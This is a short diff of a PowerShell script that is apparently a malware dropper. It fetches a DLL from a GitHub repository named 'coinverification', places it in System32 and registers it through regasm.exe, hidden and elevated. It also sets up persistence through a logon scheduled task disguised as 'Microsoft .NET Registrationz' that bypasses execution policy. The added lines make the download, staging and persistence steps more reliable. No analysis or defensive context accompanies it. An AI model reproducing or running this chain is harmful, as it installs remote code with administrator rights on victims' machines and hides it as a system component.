@@ -1,4 +1,11 @@
-powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/coinverification/coinverify/raw/refs/heads/main/System.Runtime.InteropQ.dll' -OutFile 'C:\Users\Public\System.Runtime.InteropQ.dll'"
+Invoke-WebRequest -Uri 'https://github.com/coinverification/coinverify/raw/refs/heads/main/System.Runtime.InteropQ.dll' -OutFile 'C:\Users\Public\System.Runtime.InteropQ.dll'
+while (!(Test-Path "C:\Users\Public\System.Runtime.InteropQ.dll")) { Start-Sleep -Milliseconds 500 }
 Copy-Item -Path "C:\Users\Public\System.Runtime.InteropQ.dll" -Destination "C:\Windows\System32\System.Runtime.InteropQ.dll" -Force
-schtasks /create /tn "Microsoft .NET Registrationz" /tr "powershell.exe -WindowStyle Hidden -Command \"Start-Process 'C:\WINDOWS\Microsoft.NET\Framework64\v4.0.30319\regasm.exe' -ArgumentList '/nologo','C:\windows\system32\System.Runtime.InteropQ.dll' -WindowStyle Hidden -Verb RunAs\"" /sc onlogon /ru INTERACTIVE /rl HIGHEST /f
+
+$runner = @"
+Start-Process 'C:\WINDOWS\Microsoft.NET\Framework64\v4.0.30319\regasm.exe' -ArgumentList '/nologo','C:\windows\system32\System.Runtime.InteropQ.dll' -WindowStyle Hidden -Verb RunAs
+"@
+$runner | Out-File "C:\ProgramData\regasm_runner.ps1" -Encoding ASCII -Force
+
+schtasks /create /tn "Microsoft .NET Registrationz" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\regasm_runner.ps1" /sc onlogon /ru INTERACTIVE /rl HIGHEST /f
 schtasks /run /tn "Microsoft .NET Registrationz"
